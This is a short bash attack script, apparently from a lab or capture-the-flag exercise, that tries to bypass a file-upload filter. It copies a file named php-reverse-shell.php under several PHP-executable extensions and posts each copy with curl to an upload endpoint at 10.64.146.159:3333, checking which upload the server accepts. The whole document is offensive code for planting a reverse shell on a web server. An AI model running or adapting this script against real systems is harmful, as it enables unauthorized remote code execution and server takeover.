#!/bin/bash

extensions=("php" "php3" "php4" "php5" "phtml")

for ext in "${extensions[@]}"
do
  echo $ext
  cp php-reverse-shell.php php-reverse-shell.copy.$ext
  curl -X POST -F file=@php-reverse-shell.copy.$ext 10.64.146.159:3333/internal/index.php | grep "</body>"
done
